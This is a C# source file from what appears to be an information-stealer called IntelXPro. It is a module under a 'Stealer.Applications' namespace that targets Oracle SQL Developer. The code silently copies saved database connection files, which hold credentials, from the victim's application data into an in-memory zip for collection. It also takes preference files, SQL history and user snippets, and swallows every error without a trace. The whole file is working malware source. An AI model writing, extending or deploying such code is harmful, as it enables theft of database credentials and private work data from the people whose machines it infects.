using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class OracleSQLDeveloper : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string sqlDevPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SQL Developer");

            if (!Directory.Exists(sqlDevPath))
            {
                return;
            }

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "OracleSQLDeveloper";

            bool foundData = false;

            foundData |= CollectConnections(sqlDevPath, zip, counterApplications);
            foundData |= CollectUserPreferences(sqlDevPath, zip, counterApplications);
            foundData |= CollectSQLHistory(sqlDevPath, zip, counterApplications);

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectConnections(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "system*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string connectionsPath = Path.Combine(versionDir, "o.jdeveloper.db.connection");
                    if (Directory.Exists(connectionsPath))
                    {
                        string[] connectionFiles = Directory.GetFiles(connectionsPath, "*.xml", SearchOption.AllDirectories);
                        
                        foreach (string file in connectionFiles)
                        {
                            string relativePath = file.Substring(connectionsPath.Length + 1);
                            string zipPath = $"Applications\\OracleSQLDeveloper\\{versionName}\\connections\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string connectionsFile = Path.Combine(versionDir, "o.sqldeveloper", "connections.xml");
                    if (File.Exists(connectionsFile))
                    {
                        string zipPath = $"Applications\\OracleSQLDeveloper\\{versionName}\\connections.xml";
                        zip.AddFile(zipPath, File.ReadAllBytes(connectionsFile));
                        counterApplications.Files.Add(connectionsFile + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectUserPreferences(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "system*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string prefsPath = Path.Combine(versionDir, "o.sqldeveloper");
                    if (Directory.Exists(prefsPath))
                    {
                        string[] prefFiles = new string[]
                        {
                            "product-preferences.xml",
                            "windowinglayout.xml",
                            "system.properties"
                        };

                        foreach (string prefFile in prefFiles)
                        {
                            string fullPath = Path.Combine(prefsPath, prefFile);
                            if (File.Exists(fullPath))
                            {
                                string zipPath = $"Applications\\OracleSQLDeveloper\\{versionName}\\{prefFile}";
                                zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                                counterApplications.Files.Add(fullPath + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectSQLHistory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "system*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string sqlHistoryPath = Path.Combine(versionDir, "o.sqldeveloper", "SqlHistory");
                    if (Directory.Exists(sqlHistoryPath))
                    {
                        string[] historyFiles = Directory.GetFiles(sqlHistoryPath, "*.xml", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in historyFiles.Take(20))
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\OracleSQLDeveloper\\{versionName}\\SqlHistory\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string snippetsPath = Path.Combine(versionDir, "o.sqldeveloper", "UserSnippets.xml");
                    if (File.Exists(snippetsPath))
                    {
                        string zipPath = $"Applications\\OracleSQLDeveloper\\{versionName}\\UserSnippets.xml";
                        zip.AddFile(zipPath, File.ReadAllBytes(snippetsPath));
                        counterApplications.Files.Add(snippetsPath + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
